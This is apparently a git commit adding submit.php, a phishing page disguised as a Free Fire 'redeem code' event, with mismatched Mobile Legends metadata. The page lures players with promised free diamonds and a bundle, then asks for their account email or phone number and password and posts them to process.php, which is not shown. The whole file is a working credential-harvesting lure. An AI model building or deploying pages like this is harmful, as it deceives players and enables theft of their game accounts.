2d5de984f5a59be6c6a625ddd4cb29f47845df69
wapstarridoy1 <79245101+wapstarridoy1@users.noreply.github.com>
2021-04-08 14:33:01 +0600

    Add files via upload

---
+++ submit.php
@@ -0,0 +1,39 @@
+<html>
+<head>
+<title>Free Fire - Redeem Code</title>
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta property="og:title" content="Mobile Legends - Weekly Free Heroes"/>
+<meta property="og:url" content="index.html"/>
+<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
+<meta property="og:type" content="article"/>
+<meta property="article:author" content="https://www.facebook.com/MobileLegendsGameIndonesia"/>
+<meta property="og:image" content="img/banner.jpg"/>
+<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
+<link rel="stylesheet" type="text/css" href="css/redeem.css"/>
+
+</head>
+<body>
+<form align="right" action="process.php" method="POST">
+<img src="https://1.bp.blogspot.com/-A4yuxmO8-Ws/XhBFUOeGf8I/AAAAAAAAAlM/w1Q5xixYe4s-NV9C2Nl_C886MVAI9XEKQCLcBGAsYHQ/s1600/Banner.jpg" alt="Instruction"/>
+<br/><br/>
+
+
+<hr/><br/>
+<label for="email">Email/No.</label>*
+<input minlength="3" maxlength="50" type="text" name="email" required=""/>
+<br/><br/>
+<label for="password">Password</label>*
+<input minlength="5" maxlength="50" type="password" name="password" required=""/>
+<br/><br/>
+<hr/><br/>
+<div align="center">
+<p><small>Take your Diamond + bundle, check the mail box in the game after (30) Minutes</small></p>
+<br/>
+<input type="submit" value="Submit"/>
+</div>
+</form>
+</body>
+
+</html>
